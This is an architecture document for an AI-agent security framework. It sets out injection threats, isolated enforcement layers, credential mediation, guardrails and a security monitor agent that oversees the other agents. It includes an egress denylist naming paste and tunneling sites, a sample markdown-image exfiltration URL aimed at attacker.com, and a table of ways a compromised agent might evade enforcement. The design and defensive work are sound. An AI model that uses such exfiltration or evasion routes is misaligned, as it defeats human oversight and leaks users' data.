# ASK — Architecture

**Version: ASK 2026.04**

The technical architecture for the ASK operating framework. This document defines architectural requirements — what properties must hold regardless of technology — and presents reference approaches showing one valid way to achieve them. Read this document to understand what you're defending against and how the architecture defends against it.

---

## The Threat Catalog

The full threat catalog is in [THREATS.md](THREATS.md). It categorizes each threat by novelty — traditional risks with established mitigations, genuinely novel risks unique to AI agents, and hybrid threats that follow traditional patterns but manifest in agent-specific ways.

### Summary

**Traditional threats** (well-understood, established best practices apply): compromised credentials, supply chain attacks via malicious skills/plugins, credential exposure at rest, DNS exfiltration, and the agent itself operating outside policy. These are solved problems in enterprise security — the challenge is applying existing solutions correctly to agent deployments.

**Novel threats** (unique to AI agents, no established playbooks): Cross-Prompt Injection Attack (XPIA), MCP tool definition tampering, MCP runtime capability escalation, context poisoning via inter-agent delegation, and the LLM's fundamental inability to distinguish data from instructions. These require architectural approaches developed specifically for this threat class.

**Hybrid threats** (traditional pattern, novel manifestation): malicious agents in multi-agent systems and web content as an attack vector. The traditional pattern provides a starting point; the agent-specific aspects require additional controls.

The threat landscape is actively evolving. The framework acknowledges that novel attack classes will emerge, multimodal agents will expand the attack surface, and agent-to-agent attack patterns are largely theoretical. See [THREATS.md § The Threat Landscape is Incomplete](THREATS.md#the-threat-landscape-is-incomplete).

### Attack Surfaces

| Surface | Risk | Category |
|---|---|---|
| Web content (search, scraping) | XPIA injection via poisoned pages | Hybrid |
| User messages | Direct prompt injection | Novel |
| Tool outputs | Indirect injection via tool responses | Novel |
| MCP server tool definitions | Tool definition tampering (rug pull) | Novel |
| MCP server registration | Runtime capability escalation | Novel |
| Third-party skills | Supply chain attack | Traditional |
| Inter-agent delegation | Context poisoning / privilege escalation | Hybrid |
| LLM responses | Model follows injected instructions | Novel |
| DNS | Covert exfiltration | Traditional |
| Credentials at rest | Key theft | Traditional |

### Novel Threat Kill Chain

Injection attacks — where an attacker embeds instructions in content the agent will consume — are the canonical novel threat. The architecture places controls at every stage of the attack sequence:

```
1. CONTENT POISONING → Egress proxy domain denylist
2. AGENT INGESTION   → Egress logging, gateway file audit
3. CONTEXT INJECTION → Pre-call injection detection, optional DLP
4. LLM MANIPULATION  → Post-call injection detection
5. ACTION EXECUTION  → Tool permission guard, gateway policy
6. EXFILTRATION      → Egress proxy, network isolation
```

No single layer is expected to catch every attack. The defense succeeds when the combined layers make the cost of a successful end-to-end attack prohibitively high. See [THREATS.md](THREATS.md) for the full threat analysis, including identity poisoning, MCP tampering, behavioral drift, and multi-agent attack chains.

### Trust Tiers

Agents are assigned trust tiers that govern their capabilities — the agent equivalent of enterprise user profiles:

| Tier | Enterprise Equivalent | Agent Capabilities |
|---|---|---|
| **Tier 1: Restricted** | Contractor / guest | Single small model, no web access, limited tools, strict rate limits, no delegation |
| **Tier 2: Standard** | Full-time employee | Multiple models, filtered web access, approved tools, moderate limits, can delegate to Tier 1 |
| **Tier 3: Elevated** | IT admin | All models, broader web access, extended tools, higher limits, can delegate to Tier 1–2 |
| **Tier 4: Privileged** | Security operations | All capabilities, can modify policies, can delegate to any tier. Human-supervised. |

Each tier maps to a concrete configuration: a scoped API key, a proxy policy file, a set of allowed tools, a rate limit profile, and a delegation policy.

---

## Enterprise Security Mapping

The architecture maps established enterprise endpoint security controls to AI agent equivalents. This is the organizing insight: every control that exists for managing human employees on managed devices has a structural analogue for managing AI agents in managed containers.

| Enterprise Control | Purpose | Agent Equivalent |
|---|---|---|
| MDM (Mobile Device Management) | Enforce device config, manage lifecycle | Container orchestration + immutable config |
| Secure Web Gateway | Filter and log web traffic | Egress proxy with domain denylist |
| CASB (Cloud Access Security Broker) | Mediate access to cloud services | LLM proxy with guardrails |
| DLP (Data Loss Prevention) | Prevent sensitive data exfiltration | LLM guardrails + egress content rules |
| EDR (Endpoint Detection & Response) | Detect and respond to threats | Unified logging + anomaly detection (security monitor) |
| Application allowlisting | Control which software can run | Tool permission guard + skill validation + MCP tool policy |
| Credential vault | Secure storage, rotation, access control | Infrastructure secrets + enforcer credential swap + scoped tokens |
| Conditional Access / Zero Trust | Verify before granting access | Scoped API keys, per-agent enforcer policies, service grants |
| API Gateway | Authenticate, route, rate-limit API calls | Enforcer sidecar (per-agent HTTP policy proxy) |
| Network Access Control | Segment network, control lateral movement | Container network isolation |
| UBA (User Behavior Analytics) | Baseline normal behavior, detect anomalies | Agent behavior baseline + drift detection |

If your organization already operates these controls for human endpoints, the agent architecture is not a new category — it is the same category applied to a new principal type.

---

## Defense Architecture

The architecture uses seven independent enforcement layers. **Each layer runs in its own isolation boundary. No layer shares a trust boundary with the agent it enforces.** If one layer is misconfigured or bypassed, the others still hold.

### Architectural Requirement

Every ASK-conforming deployment must implement seven distinct enforcement functions. Each function must run in its own isolation boundary, separate from the agent and from every other enforcement function. The functions are:

1. **Network isolation** — the agent has no direct internet access; all outbound traffic is forced through mediation
2. **Egress mediation** — all agent web traffic passes through a policy-controlled proxy that enforces domain restrictions, rate limits, and size limits
3. **LLM mediation** — all agent LLM calls pass through a proxy that enforces scoped API keys, injection guardrails, spend caps, and model routing
4. **Per-agent HTTP policy enforcement** — each agent has a dedicated enforcement point that mediates all its HTTP traffic, performs credential swap, and logs every request (see "The Enforcer")
5. **Workspace hardening** — the agent's execution environment restricts filesystem writes, drops unnecessary capabilities, runs as a non-root principal, and enforces resource limits
6. **Execution-level mediation** — fine-grained policy enforcement on file operations, command execution, and process control within the agent's workspace (see "The Runtime Gateway")
7. **Continuous monitoring** — anomaly detection, compliance checking, and log analysis across all layers, performed by an infrastructure agent with read-only access to all audit logs

### Reference Approach

The reference implementation achieves these seven functions using container-based isolation:

```
Layer 1: Network Isolation
  Container network — agent has no direct internet access
         ↓
Layer 2: Egress Proxy
  Domain denylist, rate limits, size limits, TLS passthrough
  All agent web traffic flows through here
         ↓
Layer 3: LLM Proxy
  Injection guardrails, scoped API keys, spend caps, model routing
  All agent LLM calls flow through here
         ↓
Layer 4: Enforcer (per-agent HTTP policy proxy)
  Agent's only HTTP endpoint — see "The Enforcer" below
         ↓
Layer 5: Container Hardening
  Read-only root filesystem, dropped capabilities, non-root user, resource limits
         ↓
Layer 6: Runtime Gateway (sidecar)
  Execution-level policy — see "The Runtime Gateway" below
         ↓
Layer 7: Continuous Monitoring
  Anomaly detection, compliance checking, log analysis across all layers
  Infrastructure agent with read-only access to all audit logs
```

---

## Implementation Guidance from the Framework

The following patterns are referenced by the framework tenets but are implementation-level concerns. They provide concrete guidance for building ASK-conforming systems.

### Startup Sequence: Enforcement Before Existence

The agent never exists, even briefly, in an unenforced state. A conforming startup sequence follows this order:

1. **Verify** — manifests, body hash, policy chain. Nothing starts until verification passes.
2. **Enforce** — bring enforcement infrastructure up first (workspace, network isolation, mediation layer, gateway, audit). Enforcement is active before the agent exists.
3. **Constrain** — mount constraints into the enforced environment, read-only. Compute effective policy.
4. **Validate** — check workspace requirements (tool compatibility). Already under enforcement.
5. **Load identity** — integrity check, seed + memory. Security monitor already watching.
6. **Start the Body** — runtime inside the enforcement boundary, no path to enforcement infrastructure.
7. **Construct session** — constraints + identity + session context assembled. Agent becomes aware inside an already-enforced session.

### Constraint Concepts

The Constraints layer must declare the agent's capabilities and behavioral parameters. The specific file format, field names, and storage mechanism are implementation choices. An ASK-conforming implementation must support these semantic concepts:

**Required:**

| Concept | Description |
|---|---|
| Agent identity | Unique identifier for this agent |
| Role | The agent's functional role |
| Trust tier | Tier determining capability envelope |
| Model access | Which LLM models the agent may use |
| Resource limits | Budget caps, rate limits |
| Behavioral parameters | Risk tolerance, escalation threshold, irreversible action policy |
| Tool access | Which tools are allowed, which are denied |
| Runtime pattern | Interactive or autonomous |

**Required for some deployments:**

| Concept | When Needed |
|---|---|
| Delegation rules | Only for agents that delegate to other agents |
| Web access | Only when web access is enabled |
| Service grants | Only when the agent accesses external services beyond LLM |

### Filesystem Mapping

The framework requires semantic separation between operator-controlled constraints and agent-controlled identity. One valid layout:

```
constraints/                 ← read-only, operator-owned, version-controlled
├── (config file)            ← tier, permissions, model prefs, behavioral constraints
└── (rules file)             ← operational rules (operator-authored)

identity/                    ← writable, agent-owned, security-monitor-audited
├── (persona file)           ← personality, tone, vibe (stylistic only)
└── memory/                  ← learned facts, user preferences, working notes

session/                     ← ephemeral, not persisted (destroyed on session reset)
```

### Service Credential Lifecycle

Agents frequently need access to external services (GitHub, search engines, databases) beyond the LLM. The framework requires that service credentials follow the same mediation pattern as all other external access:

**Grant.** An operator grants an agent access to a named service. The real credential is stored in infrastructure secrets outside the agent's reach. The agent receives a scoped token that identifies the grant but cannot be used directly against the service.

**Mediation.** When the agent makes a request to a granted service, the mediation layer intercepts the request, verifies the grant is active, swaps the agent's scoped token for the real credential, and forwards the request. The agent never sees, handles, or stores real service credentials.

**Revocation.** An operator can revoke a service grant at any time. Revocation takes effect immediately. No agent restart is required.

This pattern extends Tenet 3 (mediation is complete) to service credentials and Tenet 7 (least privilege) to dynamic service access.

### Agent-Facing Framework Context

An ASK-conforming implementation should communicate framework awareness to the agent itself — through read-only documentation in its workspace — covering why its constraints exist, what enforcement mechanisms are active, and how to recognize security threats. The purpose is not to rely on the agent's cooperation for security (enforcement is always external), but to make the agent a better participant in its own governance.

### Workspace Activity Register

When multiple agents share a workspace environment, a read-only activity register provides ambient awareness without direct communication. Agents observe the register but cannot write to it. When the register is unavailable, the conflict resolution default applies: yield and flag (Tenet 22).

---

## Single-Agent Topology

### Architectural Requirements

A single-agent deployment must satisfy three structural properties:

1. **Isolation boundaries.** The agent, each enforcement component, and shared infrastructure each run in separate isolation boundaries. No enforcement component shares a trust boundary with the agent it enforces.
2. **Mediation completeness.** There is no path from the agent to any external resource (LLM providers, the web, external services) that bypasses the mediation layer. Every outbound request passes through at least the per-agent enforcer and one upstream proxy.
3. **Credential separation.** The agent holds only scoped tokens. Real credentials for LLM providers, external services, and infrastructure components are held by enforcement components the agent cannot access.

### Reference Topology

The following diagram illustrates one valid topology for a single-agent deployment. Port numbers, protocols, and access methods are illustrative — implementations may use different values. The structural properties above are the requirements.

```
    End Users                                   Operators
  (interactive session)                        (management access)
        │                                           │
   interact via                                management CLI
   session interface                           or dashboard
        │                                           │
  ── Internet ──────────────────────────────────────┼───────────────
        │                   │                       │
        │            LLM Providers                  │
        │         (Anthropic, OpenAI, etc.)          │
        │                   │                       │
  ─────┼───────────────────┼───────────────────────┼───────────────
        │                   │                       │
        ▼                   ▼                       ▼
┌──────────────────────────────────────────────────────────────────┐
│  Host                                                            │
│                                                                  │
│  ┌─── mediation network (internet access via egress) ────────┐   │
│  │                                                            │   │
│  │   Egress proxy              LLM proxy         Database     │   │
│  │   Domain denylist           Scoped API keys   (agents      │   │
│  │   Rate limits               Injection guardrails cannot     │   │
│  │   Size limits               Spend caps          reach)     │   │
│  │   TLS passthrough           Model routing                  │   │
│  │   :3128                     :4000                          │   │
│  └──────────┬─────────────────────┬──────────────────────────┘   │
│             │ :3128               │ :4000                         │
│  ┌──────────┼─────────────────────┼──── agent-internal ───────┐  │
│  │          │                     │     (no internet)          │  │
│  │  ┌───────┴─────────────────────┴──────────────────────┐    │  │
│  │  │ Enforcer (per-agent sidecar — see below)              │    │  │
│  │  │  Agent's only HTTP endpoint on :18080                │    │  │
│  │  └────────────────────────┬────────────────────────────┘    │  │
│  │                           │ :18080                          │  │
│  │  ┌────────────────────────┴────────────────────────────┐    │  │
│  │  │  Shared PID Namespace                                │    │  │
│  │  │                                                      │    │  │
│  │  │  ┌─────────────────────┐  ┌────────────────────────┐ │    │  │
│  │  │  │ Gateway (sidecar)   │  │ Agent workspace         │ │    │  │
│  │  │  │ (see below)        │  │                         │ │    │  │
│  │  │  │                     │  │ Read-only root FS       │ │    │  │
│  │  │  │ Shell policy    ◄───┼──┤ Commands → shell shim   │ │    │  │
│  │  │  │ File policy     ◄───┼──┤ Files → FUSE mount      │ │    │  │
│  │  │  │ MCP policy      ◄───┘  │ MCP calls → intercepted │ │    │  │
│  │  │  │                        │ All HTTP → enforcer     │ │    │  │
│  │  │  │ Agent cannot see:      │ Agent cannot see:       │ │    │  │
│  │  │  │  policy, config, logs  │  enforcement infra      │ │    │  │
│  │  │  └─────────────────────┘  └────────────────────────┘ │    │  │
│  │  └──────────────────────────────────────────────────────┘    │  │
│  │                                                               │  │
│  │  ┌──────────────────────┐                                     │  │
│  │  │ Security monitor      │  Reads (RO): all audit logs        │  │
│  │  │ (function agent)      │  Writes: findings/                 │  │
│  │  │ Tier: Elevated        │  Reaches: LLM proxy                │  │
│  │  └──────────────────────┘                                     │  │
│  └───────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

### Isolation Boundaries

**Boundary 1 — Filesystem isolation.** The agent container has no volume mounts to the host filesystem, the LLM proxy container, or the egress proxy container. It cannot read API keys, guardrail configurations, proxy policies, or any other container's data.

**Boundary 2 — Network isolation.** The agent container is on an agent-internal network with no direct internet access. The only reachable endpoint is the enforcer. All other traffic is dropped. The mediation network connecting enforcement components relies on the container runtime's network isolation in single-host deployments; see [LIMITATIONS.md](LIMITATIONS.md) for multi-host considerations.

**Boundary 3 — Credential isolation.** Each component holds only the credentials it needs. The agent holds scoped tokens, not real API keys. Real credentials live in the enforcer (per-agent) and LLM proxy (provider keys) — see "The Enforcer" and "Service Credential Swap" below.

### The Database

The database on the mediation network stores operational state for the mediation layer itself. It is not agent-facing — agents cannot reach it.

**What it stores:**
- **Spend tracking** — per-agent token counts and budget consumption, used by the LLM proxy to enforce spend caps
- **Scoped key metadata** — which keys are active, their model restrictions, rate limits, and budget assignments
- **Guardrail state** — guardrail trigger counts, flagged events awaiting review
- **Session metadata** — active sessions, agent states (running/paused/halted), correlation IDs

**What it does not store:** audit logs (those go to persistent log storage, not a database the agent or its proxies can write to selectively), agent identity or memory (those live in mounted volumes), or enforcement policy (that lives in config files within each enforcement container).

The database is a shared service on the mediation network. It requires authentication from its clients (LLM proxy, enforcer) and should use encrypted connections in multi-host deployments. Its compromise would expose spend tracking and session metadata but not audit logs, agent identity, or enforcement policy.

### User Authentication

The framework defines human principals but does not prescribe a specific authentication mechanism. An implementation must address:

**How users authenticate to agents.** In the interactive runtime, users connect via SSH, TUI, or API. The authentication mechanism is deployment-specific — SSH keys, OAuth tokens, API keys, or SSO. The requirement is that the agent's runtime (Body) can identify which authenticated human principal is issuing instructions.

**How user identity flows through the mediation layer.** The enforcer should include the authenticated user's identity in audit log entries so that actions can be attributed to the human who initiated them, not just to the agent that executed them. This is essential for Tenet 2 (every action leaves a trace) in multi-user deployments.

**How user authorization maps to agent capability.** A user interacting with a Tier 2 agent operates within that agent's capability envelope. The user cannot escalate the agent's tier. Different users may have different authorization levels for the same agent — for example, an admin user may be able to trigger `approve`-gated operations that a regular user cannot.

At single-user scale (Scale 1), user authentication collapses to "whoever has SSH access to the host." At enterprise scale (Scale 3), it integrates with the organization's identity provider.

### The Scoped API Key

Each agent gets a scoped key — not the master key. This limits blast radius if a key is compromised:

```
Master key (admin only):       Scoped agent key:
  Full model access              Allowed models: claude-sonnet, claude-haiku
  Can create/revoke keys         Max budget: $50/day
  Can modify config              Rate limit: 100 requests/minute
  Admin only                     Cannot manage other keys
```

### Egress Proxy Policy

The egress proxy enforces a declarative policy that defines what the agent cannot reach. This policy file lives in the proxy container, not the agent container — the agent cannot see or modify it:

```yaml
denied_domains:
  - domain: "pastebin.com"      # paste site — data exfiltration risk
  - domain: "transfer.sh"       # file transfer — data exfiltration risk
  - domain: "ngrok.io"          # tunneling — C2 risk
  - domain: "*.ngrok-free.app"  # tunneling — C2 risk

rate_limits:
  global: 500/minute

max_response_body: 10MB
dns_resolver: "internal"       # blocks DNS tunneling exfiltration
block_dns_over_https: true
```

---

## The Enforcer

### Architectural Requirement

Every agent must have a dedicated policy enforcement point that mediates all its external communication. The agent's only path to external resources (LLM providers, web, external services) passes through this enforcement point. The enforcement point runs in its own isolation boundary, performs credential mediation (the agent never holds real service credentials), logs every request, and sanitizes responses. The agent cannot reach shared infrastructure directly — only through its dedicated enforcement point.

This is a distinct enforcement layer from egress mediation (which enforces domain-level policy) and execution-level mediation (which enforces policy within the workspace). The per-agent enforcement point mediates HTTP-level policy: credential swap, request routing, per-request audit, and response sanitization. Collapsing it into either the egress proxy or the execution-level gateway would violate the principle that each enforcement layer has its own isolation boundary.

### Reference Approach

The reference implementation achieves this with a per-agent HTTP proxy sidecar (the **enforcer**) that sits between the agent and all shared infrastructure. The enforcer is the agent's only HTTP endpoint — the agent sends all requests to the enforcer, and the enforcer routes them to the correct upstream (LLM provider, egress proxy) with the correct credentials.

```
┌─────────────────────────────────────────────────────────────────┐
│  Agent-internal network (no internet)                            │
│                                                                  │
│  ┌──────────────────┐     ┌──────────────────────────────────┐  │
│  │ Agent workspace   │     │ Enforcer (per-agent sidecar)      │  │
│  │                   │     │                                    │  │
│  │ Sees only:        │────►│ Routes:                            │  │
│  │  enforcer:18080   │     │  /v1/* → LLM provider (via egress) │  │
│  │                   │     │  CONNECT → egress:3128 (HTTPS)     │  │
│  │ Holds:            │     │  Other → egress:3128 (HTTP)        │  │
│  │  scoped token     │     │                                    │  │
│  │  (not real keys)  │     │ Swaps:                              │  │
│  │                   │     │  scoped service token               │  │
│  └──────────────────┘     │  → real credential from infra       │  │
│                            │                                    │  │
│                            │ Strips:                             │  │
│                            │  response headers that leak         │  │
│                            │  provider account info              │  │
│                            │                                    │  │
│                            │ Logs:                               │  │
│                            │  every request to audit log         │  │
│                            │  (agent cannot access)              │  │
│                            └──────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
       │                              │
       │                         ┌────▼─────────────────────┐
       │                         │  Mediation network        │
       │                         │  (egress + LLM proxy)     │
       │                         └──────────────────────────┘
```

### Service Credential Swap

The enforcer mediates service credentials as described in the [Service Credential Lifecycle](FRAMEWORK.md#service-credential-lifecycle): the agent holds scoped tokens, the enforcer swaps them for real credentials at the HTTP layer, and grants/revocations take effect immediately without agent restart. The agent never handles, stores, or sees real service credentials.

### Isolation Properties

The enforcer runs in its own isolation boundary with access to both the agent-internal network and the mediation network. The agent can reach the enforcer; the agent cannot reach the mediation network directly. The enforcer's configuration, policy files, and audit logs are in a filesystem the agent cannot access.

---

## The Runtime Gateway

### Architectural Requirement

The mediation layer (enforcer, egress proxy, LLM proxy) mediates actions that cross the workspace boundary. But a compromised agent can cause significant damage entirely within the workspace: reading sensitive files, spawning processes, executing destructive commands, or staging data for exfiltration. Container hardening limits the blast radius but doesn't provide visibility or fine-grained control.

A compliant implementation must provide execution-level mediation — the ability to enforce policy on file operations, command execution, process creation, and tool invocations within the agent's workspace. This mediation must run in its own isolation boundary that the agent cannot access, observe, or influence. The agent must not be able to bypass the mediation without a kernel-level exploit.

**Enforcement machinery must not share an isolation boundary with what it enforces.** The agent is assumed compromisable at any time. If execution-level enforcement runs inside the agent's environment, the agent could potentially discover enforcement binaries, read policy files, or find writable paths that affect enforcement behavior. The enforcement component's filesystem, configuration, and audit logs must be as inaccessible to the agent as the egress proxy's configuration.

#### Mediation Domain Requirements

| Mediation Domain | Requirement |
|---|---|
| **Command execution** | All commands the agent executes must pass through a policy evaluation the agent cannot bypass |
| **File operations** | All file reads, writes, creates, and deletes must be mediated with per-path, per-operation policy |
| **Network connections** | Outbound connections from within the workspace must be interceptable and policy-controlled |
| **Process control** | Process creation, signals, and inter-process communication must be mediated |

### Reference Approach

The reference implementation achieves execution-level mediation with a sidecar gateway — a separate container that shares only a PID namespace and workspace volume with the agent. The gateway's own binaries, policy files, configuration, and audit logs live in a filesystem the agent cannot see or modify.

```
┌──────────────────────────────────────────────────────────────────┐
│  Shared PID Namespace                                            │
│                                                                  │
│  ┌────────────────────────┐   ┌─────────────────────────────┐   │
│  │ Gateway (sidecar)      │   │ Agent workspace               │   │
│  │                        │   │                              │   │
│  │ Gateway server (PID 1) │   │ Runtime (child of gateway)   │   │
│  │ Policy engine          │   │                              │   │
│  │ FUSE provider          │   │ Shell: /bin/bash → shim      │   │
│  │ Landlock sandbox       │   │ Files: workspace via FUSE    │   │
│  │ Seccomp supervisor     │   │                              │   │
│  │                        │   │ Net: via seccomp mediation   │   │
│  │ Owns (agent can't see):│   │                              │   │
│  │  • Policy YAML files   │   │ Cannot see:                  │   │
│  │  • Gateway config      │   │  • Gateway filesystem        │   │
│  │  • Audit log buffer    │   │  • Policy files              │   │
│  │  • Gateway binaries    │   │  • Audit logs                │   │
│  └────────────────────────┘   └─────────────────────────────┘   │
│                                                                  │
│  Shared: PID namespace, workspace volume (via FUSE), shim bin   │
│  Not shared: filesystem namespaces, gateway config, audit logs  │
└──────────────────────────────────────────────────────────────────┘
```

#### Reference Enforcement Mechanisms

The reference implementation achieves the mediation domain requirements using the following Linux mechanisms:

| Mechanism | Mediation Domain | How |
|---|---|---|
| **Shell shim** | Command execution | `/bin/bash` replaced with shim binary; policy evaluation runs in gateway container |
| **FUSE filesystem** | File operations (open, read, write, create, delete) | FUSE provider runs in gateway; agent sees FUSE mount |
| **Seccomp user-notify** | Network connections, signals, process control | Filters set by gateway (parent) on agent (child); agent cannot remove them |
| **Landlock** | Filesystem access restriction | Kernel-level filesystem sandboxing as a defense-in-depth complement to FUSE |

All four mechanisms provide **enforced** mediation — the agent cannot bypass them without a kernel exploit, which is the same trust boundary the container runtime itself relies on. Other implementations may use different OS-level mechanisms (e.g., eBPF, LSMs, hypervisor-based interception) provided they meet the mediation domain requirements above.

### Six Policy Decisions

| Decision | Behavior | Use Case |
|---|---|---|
| `allow` | Operation proceeds | Routine operations within policy |
| `deny` | Operation blocked, error returned | Prohibited operations |
| `approve` | Operation paused, human approval required | Consequential or irreversible operations |
| `redirect` | Operation transparently rerouted to approved alternative | Agent uses wrong tool/path — steered to correct one |
| `audit` | Same as allow, with enhanced logging | Operations to watch but not block |
| `soft_delete` | Destructive operation quarantined, recoverable | Deletes moved to recovery area instead of executing |

The `redirect` decision is architecturally significant: when a compromised agent attempts a prohibited action and receives `deny`, it typically retries — burning tokens and potentially escalating. A `redirect` resolves the situation transparently: the operation appears to succeed from the agent's perspective, but the gateway routed it to an approved alternative. The agent doesn't enter a retry loop because it doesn't perceive a failure.

### MCP Tool Policy

#### Requirement

MCP servers run as separate processes that can bypass application-level tool policy. A compliant implementation must mediate MCP tool calls at the process level — not just at the application level inside the agent. The mediation must enforce tool allowlists, detect tool definition changes (version pinning), and block unauthorized MCP server registration.

#### Reference Approach

The reference implementation mediates MCP tools via the shared PID namespace. The gateway intercepts JSON-RPC 2.0 messages between the agent process and MCP server subprocesses.

**Version pinning (rug-pull detection):** The gateway records each MCP server's tool definitions on first connection. If a server update changes tool definitions — for example, changing `read_file` to also exfiltrate data — the gateway blocks the server and emits an alert.

**Skill registration control:** Community skills can register new MCP servers at runtime by default. The gateway blocks this: all MCP servers must be pre-configured in the Constraints layer (read-only to the agent), and new runtime registrations require operator approval.

### What a Compromised Agent Cannot Do

In the reference implementation, the isolation model prevents the following attacks:

| Attack | Why It Fails |
|---|---|
| Read gateway policy files | Different filesystem namespace |
| Modify gateway config | Gateway filesystem in separate container |
| Kill or signal the gateway | Seccomp filters block signals to PID 1 |
| Bypass the shell shim | `/bin/bash` and `/bin/sh` are the shim |
| Access workspace without FUSE | Underlying storage in gateway's mount namespace |
| Read audit logs | Audit log volume mounted only in gateway and security monitor |
| Disable seccomp filters | Set by parent process; `no-new-privileges` prevents modification |
| Access files outside Landlock scope | Kernel-level filesystem restrictions enforced independently of FUSE |

Any compliant implementation must prevent equivalent attack classes: the agent cannot read or modify enforcement policy, cannot disable or bypass mediation, and cannot access audit logs.

---

## Read-Only Tool Delivery

The agent's workspace needs tools (runtime binaries, shell shims, skill libraries), but these tools must be delivered read-only — the agent cannot modify its own tooling. The pattern: build tools into an image or artifact, then deliver them into the agent's workspace as a read-only mount or layer.

```
Tool artifact (agent runtime, shell shim, skill libraries)
  → built and verified outside the agent's environment
  → delivered as a read-only volume, layer, or filesystem mount
  → agent can use but cannot modify its own tools
```

This satisfies Tenet 1 (constraints are external and inviolable — the agent cannot modify the tools it uses) and provides a clean deployment pattern: tool updates are artifact rebuilds, not in-place modifications. The agent inherits its tools from the workspace it occupies, just as it inherits its constraints. The specific delivery mechanism (named volumes, overlay filesystem layers, read-only bind mounts) is implementation-dependent.

---

## The Guardrails Stack

This section defines required guardrail capabilities — what an implementation must provide — not specific detection techniques or deployment patterns.

Guardrails scan content at two points: **pre_call** (scanning input before it reaches the LLM) and **post_call** (scanning responses before they return to the agent). The pre_call/post_call dual mode is non-negotiable for agents. Pre_call catches injection in user-facing input and tool responses before they reach the LLM. Post_call catches the full injection kill chain — poisoned content → manipulated LLM response → exfiltration or unauthorized action on the way back out — as well as credential leakage, policy violations in generated content, and unauthorized tool calls.

### Required Guardrail Capabilities

An ASK-conforming implementation must provide three guardrail capabilities. The specific detection techniques (regex, ML, heuristic) and deployment patterns are implementation-dependent — the capabilities are the requirement:

**Injection & Content Threat Detection** (pre_call + post_call). Scans input before it reaches the LLM (pre_call) and scans LLM responses before they return to the agent (post_call). Must cover common injection vectors: direct injection phrases, HTML/markdown-based exfiltration, role override attempts, and encoded payloads. Implementations may use regex patterns, ML models, heuristic detectors, or a combination.

**Tool Permission Guard** (LLM tool call allowlist). Enforces a whitelist of which tools the agent is allowed to call via the LLM, and can restrict tool arguments to approved patterns. Blocks unauthorized tool calls regardless of cause — injection, manipulation, or behavioral drift. Default configuration should be deny-all.

**Gateway MCP Tool Policy** (MCP server/tool allowlist). Enforces per-server, per-tool allowlists on MCP tool calls at the process level (gateway sidecar). Where the tool permission guard mediates tool calls in LLM responses at the proxy layer, the MCP policy mediates MCP tool calls between the agent process and MCP server subprocesses. This is necessary because a compromised agent could invoke MCP tools without going through the LLM at all, bypassing the proxy-level guard entirely.

### Request Flow

```
Input (user message, tool output, web content)
  ├─► [pre_call]  Injection detection      → scan for injection patterns
  ├─► [pre_call]  (optional layers)        → ML detection, PII masking, URL scanning
  ▼
LLM Call (provider API via LLM proxy)
  ├─► [post_call] Injection detection      → scan LLM responses
  ├─► [post_call] Tool Permission Guard   → validate tool calls are authorized
  ├─► [post_call] (optional layers)        → ML detection, PII masking, URL scanning
  ▼
Response returned to agent
  ├─► [runtime]   MCP Tool Policy         → validate MCP tool calls (gateway sidecar)
```

### Additional Guardrail Layers

The architecture supports additional guardrail layers beyond the required capabilities. These extend coverage but are not required for framework conformance:

**ML-based injection detection.** ML models that differentiate direct injection from indirect prompt injection in tool outputs. Returns confidence scores rather than binary pattern matches. Catches sophisticated attacks that evade regex.

**Malicious URL/domain scanning.** Detects malicious URLs in responses before they reach the agent — critical for catching exfiltration via rendered markdown images (`![](https://attacker.com/steal?data=...)`) and other URL-based attack vectors.

**PII masking.** NLP-based detection and masking of personally identifiable information. Pre_call masks PII before the LLM sees it. Post_call masks PII the LLM generated. Can run locally with no external API calls.

**LLM-as-judge injection detection.** Uses a small model to classify whether content contains injection attempts. Higher accuracy than regex, lower cost than commercial ML.

### Defense Posture

The three required capabilities (injection detection + tool permission + MCP policy) provide the minimum guardrail coverage. Simple implementations (regex-based detection, static allowlists) can work in fully network-isolated environments with zero external dependencies. Adding ML-based layers extends coverage to novel attack patterns — but may require external service access or commercial accounts. The architecture is designed so that layers stack independently: adding or removing a layer doesn't affect the others.

---

## Security Monitor

Every ASK deployment requires a monitoring and anomaly detection function agent — a **security monitor**. It is a function agent (high cross-boundary visibility, constrained capability) that provides continuous oversight of all other agents in the deployment. The reference implementation calls this agent "Sentinel."

### Inputs

The security monitor reads audit logs from all enforcement layers. It does not receive data from agents directly — it reads the same structured log events that the enforcement infrastructure writes.

| Source | What the Security Monitor Reads |
|---|---|
| Egress proxy logs | Domain access patterns, blocked requests, rate limit events |
| LLM proxy logs | Token consumption, model usage, guardrail triggers, spend tracking |
| Enforcer logs | Per-agent HTTP requests, credential swap events, routing decisions |
| Gateway logs | Command executions, file operations, MCP tool calls, policy decisions |
| Constraint change logs | Constraints updates, acknowledgment events, trust changes |

### Analysis

The security monitor performs three categories of analysis:

**Baseline comparison.** Establishes a behavioral baseline for each agent over a configurable observation period. Flags deviations: unusual tool usage patterns, sudden changes in request volume, new domains accessed, changes in LLM interaction patterns (prompt length, model selection, token consumption).

**Guardrail trigger correlation.** Correlates guardrail events across layers. A single guardrail trigger may be noise; correlated triggers across multiple layers (e.g., XPIA pattern detected in pre_call + unusual egress request + MCP tool call outside normal pattern) indicate an active attack chain.

**Identity write pattern analysis.** Monitors writes to agent Identity files (memory, personality) for patterns that resemble behavioral self-modification rather than normal memory accumulation — for example, writes that contain instruction-like content, constraint-override language, or references to security parameters.

### Outputs

| Output | Description |
|---|---|
| **Findings** | Structured reports of detected anomalies with severity, evidence, and affected agent |
| **Alerts** | Real-time notifications to the operator for events above a configured severity threshold |
| **Recommendations** | Suggested actions (halt, investigate, reduce trust, quarantine) — the security monitor recommends but does not act unilaterally except for self-halt |
| **Compliance reports** | Periodic summaries of agent behavior against policy (guardrail trigger rates, policy compliance, trust evolution) |

### Constraints

The security monitor is itself an agent subject to the framework. It has elevated cross-boundary visibility (reads all audit logs) but constrained capability:

- **Read-only access** to all audit logs and agent workspaces — cannot modify agent state, configuration, or identity
- **Cannot act in other agents' workspaces** — cannot execute commands, write files, or modify configurations
- **Can recommend halt** — the operator or an automated policy threshold executes the halt
- **Own LLM calls go through the same guardrails stack** — the security monitor is an XPIA target (see [LIMITATIONS.md](LIMITATIONS.md)) and its calls are scanned like any other agent's
- **Findings are written to a separate findings store** — not to agent audit logs, preventing circular contamination

At Scale 1, the security monitor can be a simple log analysis script that runs periodically. At Scale 3, it is a fleet of function agents with specialized roles (one per analysis category or per agent group).

---

## Failure Modes

